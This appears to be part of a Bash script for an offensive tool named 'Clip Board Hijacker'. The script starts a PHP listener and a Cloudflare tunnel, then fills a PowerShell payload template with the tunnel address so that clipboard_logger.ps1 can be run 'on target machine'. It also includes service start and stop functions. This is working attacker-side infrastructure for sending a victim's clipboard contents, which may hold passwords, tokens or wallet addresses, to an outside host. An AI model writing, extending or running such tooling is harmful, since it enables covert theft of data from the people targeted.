## ANSI colors (FG & BG)
red="$(printf '\033[31m')"  
green="$(printf '\033[32m')"  
orange="$(printf '\033[33m')"  
blue="$(printf '\033[34m')" 
cyan="$(printf '\033[36m')"  
white="$(printf '\033[37m')" 
black="$(printf '\033[30m')"
redbg="$(printf '\033[41m')"
orangebg="$(printf '\033[43m')"
nc="$(printf '\e[0m\n')" #no color

## BANNER 
banner() {
echo -e "\n"
echo -e "${cyan}    ███████${orange}╗${cyan} █████${orange}╗ ${cyan}██${orange}╗${cyan}      ██████${orange}╗ ${cyan}██████${orange}╗${cyan} ███${orange}╗${cyan}   ██${orange}╗ ${nc}"
echo -e "${cyan}    ██${orange}╔════╝${cyan}██${orange}╔══${cyan}██${orange}╗${cyan}██${orange}║     ${cyan}██${orange}╔════╝${cyan}██${orange}╔═══${cyan}██${orange}╗${cyan}████${orange}╗  ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    █████${orange}╗  ${cyan}███████${orange}║${cyan}██$orange║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██${orange}║${cyan}██$orange╔${cyan}██${orange}╗ ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}╔══╝  ${cyan}██${orange}╔══${cyan}██${orange}║${cyan}██${orange}║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██$orange║${cyan}██${orange}║╚${cyan}██${orange}╗${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}║     ${cyan}██${orange}║  ${cyan}██${orange}║${cyan}███████${orange}╗╚${cyan}██████${orange}╗╚${cyan}██████${orange}╔╝${cyan}██$orange║ ╚${cyan}████${orange}║ ${nc}"
echo -e "${orange}    ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ "
echo -e "${white}${green}    Clip Board Hijacker by ${redbg}${white}RGSecurityTeam.${nc}${white} Version:$version ${nc}"
}



setup_cloudflare_tunnel() {
    { clear; banner; echo; }
    echo -e "${orange}[*] Cloudflare Tunnel Setup${nc}\n"
    
    # Start local server for tunnel
    local php_pid=$(start_php_server "127.0.0.1" "3333")
    if [ $? -ne 0 ]; then
        echo -e "${red}[!] Failed to start local server.${nc}"
        return 1
    fi
    
    echo -e "${green}[+] Starting Cloudflare tunnel...${nc}"
    
    # Clean up old log file
    rm -f .cldf.log
    
    # Start cloudflared tunnel with proper logging
    ./cloudflared tunnel --url "http://127.0.0.1:3333" --logfile .cldf.log > /dev/null 2>&1 &
    local cldf_pid=$!
    echo -e "${orange}[*] Waiting for tunnel to establish (15-20 seconds)...${nc}"
    sleep 15
    
    # Get tunnel URL with better pattern matching
    local tunnel_url=""
    if [[ -f ".cldf.log" ]]; then
        tunnel_url=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' ".cldf.log" | head -n1)
        
        # Alternative pattern if first one fails
        if [[ -z "$tunnel_url" ]]; then
            tunnel_url=$(grep -E -o 'https://[^ ]*\.trycloudflare\.com' ".cldf.log" | head -n1)
        fi
        
        # One more attempt with different pattern
        if [[ -z "$tunnel_url" ]]; then
            tunnel_url=$(grep -i 'trycloudflare' ".cldf.log" | grep -o 'https://[^ ]*' | head -n1)
        fi
    fi
    
    # Verify the tunnel is working
    if [[ -n "$tunnel_url" ]]; then
        echo -e "${green}[+] Cloudflare tunnel established: $tunnel_url${nc}"
        
        # Test the tunnel
        echo -e "${orange}[*] Testing tunnel connection...${nc}"
        if curl -s --connect-timeout 10 "$tunnel_url" > /dev/null; then
            echo -e "${green}[+] Tunnel connection test successful${nc}"
        else
            echo -e "${orange}[!] Tunnel test failed, but continuing...${nc}"
        fi
        
        # Extract hostname without protocol
        local tunnel_host=$(echo "$tunnel_url" | sed 's|https://||')
        
        # Update PowerShell script for tunnel (use port 443 for HTTPS)
        sed -e "s|IP_ADDRESS|$tunnel_host|g" -e "s|PORT_NUMBER|443|g" .templates/payload.ps1 > clipboard_logger.ps1
        
        echo -e "${green}[+] Payload configured for tunnel${nc}"
        echo -e "${green}[+] Use: ${cyan}clipboard_logger.ps1${nc} on target machine"

        # Store tunnel info
        echo "$cldf_pid" > .tunnel.pid
        echo "$php_pid" > .php.pid
        IP="127.0.0.1"
        PORT="3333"

        { clear; banner; start_monitoring; }
    else
        echo -e "${red}[!] Cloudflare tunnel failed to establish${nc}"
        echo -e "${orange}[*] Checking tunnel logs...${nc}"
        tail -10 .cldf.log 2>/dev/null || echo "No tunnel log found"
        
        # Clean up
        kill $php_pid 2>/dev/null
        kill $cldf_pid 2>/dev/null 2>/dev/null
        rm -f .tunnel.pid .php.pid
        
        echo -e "${orange}[*] Falling back to local server setup...${nc}"
        sleep 2
        setup_local_server
    fi
    
    return 0
}


stop_services() {
    echo -e "${orange}[*] Stopping all services...${nc}"
    
    # Stop PHP server
    if [[ -f ".php.pid" ]]; then
        local php_pid=$(cat .php.pid)
        kill $php_pid 2>/dev/null
        rm -f .php.pid
    fi
    pkill -f "php -S" 2>/dev/null
    
    # Stop cloudflared
    if [[ -f ".tunnel.pid" ]]; then
        local tunnel_pid=$(cat .tunnel.pid)
        kill $tunnel_pid 2>/dev/null
        rm -f .tunnel.pid
    fi
    pkill -f cloudflared 2>/dev/null
    
    echo -e "${green}[+] All services stopped.${nc}"
    sleep 2
}